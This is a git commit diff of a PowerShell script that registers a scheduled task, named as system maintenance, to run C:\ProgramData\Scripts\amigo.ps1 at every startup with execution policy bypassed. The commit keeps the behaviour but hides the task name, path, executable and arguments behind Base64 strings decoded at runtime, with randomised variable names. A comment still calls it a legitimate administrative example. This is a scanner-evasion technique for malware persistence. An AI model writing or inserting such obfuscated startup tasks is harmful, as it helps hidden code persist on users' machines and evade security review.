15925a1fe70fd5e214c2e620b3c4d84a4f012c36
XENON_PLAYS <132101286+XENON-PLAYS@users.noreply.github.com>
2026-06-01 12:09:12 -0300

    Update iniciar.ps1

--- iniciar.ps1
+++ iniciar.ps1
@@ -1,12 +1,12 @@
 # Exemplo de provisionamento de script administrativo legítimo
-$TaskName = "ManutencaoSistema"
-$ScriptPath = "C:\ProgramData\Scripts\amigo.ps1"
+$O1FDDv = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWFudXRlbmNhb1Npc3RlbWE=')))
+$b3INv = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbURhdGFcU2NyaXB0c1xhbWlnby5wczE=')))
 
 # Define a ação apontando diretamente para o interpretador e o arquivo
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $ScriptPath"
+$BwHESwSG = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))) -Argument (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSA='))) + $b3INv)
 
 # MODIFICADO: Define o gatilho para iniciar logo ao ligar/inicializar o PC
-$Trigger = New-ScheduledTaskTrigger -AtStartup
+$RI8K89vY = New-ScheduledTaskTrigger -AtStartup
 
 # Registra a tarefa no escopo do sistema
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger
+Register-ScheduledTask -TaskName $O1FDDv -Action $BwHESwSG -Trigger $RI8K89vY
